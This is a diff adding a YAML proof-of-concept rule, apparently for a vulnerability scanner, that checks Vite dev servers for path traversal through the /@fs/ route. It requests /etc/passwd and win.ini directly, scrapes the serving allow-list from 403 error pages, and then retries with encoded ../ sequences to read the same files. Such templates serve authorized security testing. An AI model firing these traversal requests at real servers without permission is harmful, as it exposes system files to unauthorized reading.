@@ -1,0 +1,66 @@
+name: poc-yaml-vite-path-traversal
+transport: http
+rules:
+  r0:
+    request:
+      cache: true
+      method: GET
+      path: /@fs/etc/passwd
+      follow_redirects: true
+    expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  r1:
+    request:
+      cache: true
+      method: GET
+      path: /@fs/windows/win.ini
+      follow_redirects: true
+    expression: |
+        response.status == 200 && response.body.bcontains(bytes("[extensions]"))
+  r2:
+    request:
+      cache: true
+      method: GET
+      path: /@fs/etc/passwd
+      follow_redirects: true
+    expression: |
+        response.status == 403 && response.body.bcontains(b"Vite serving allow list")
+    output:
+      search: |
+        r'<br/>- (?P<allowlist>([\s\S]*?))<br/>'.bsubmatch(response.body)
+      allowlist: search['allowlist']
+  r3:
+    request:
+      cache: true
+      method: GET
+      path: /@fs{{allowlist}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+      follow_redirects: true
+    expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  r4:
+    request:
+      cache: true
+      method: GET
+      path: /@fs/windows/win.ini
+      follow_redirects: true
+    expression: |
+        response.status == 403 && response.body.bcontains(b"Vite serving allow list")
+    output:
+      search: |
+        r'<br/>- (?P<allowlist>([\s\S]*?))<br/>'.bsubmatch(response.body)
+      allowlist: search['allowlist']
+  r5:
+    request:
+      cache: true
+      method: GET
+      path: /@fs/{{allowlist}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini
+      follow_redirects: true
+    expression: |
+        response.status == 200 && response.body.bcontains(bytes("[extensions]"))
+        
+expression: r0() || r1() || (r2() && r3()) || (r4() && r5())
+detail:
+  author: archer
+  links:
+    - "https://github.com/vitejs/vite/issues/2820"
+    - "https://github.com/vitejs/vite/issues/8498"
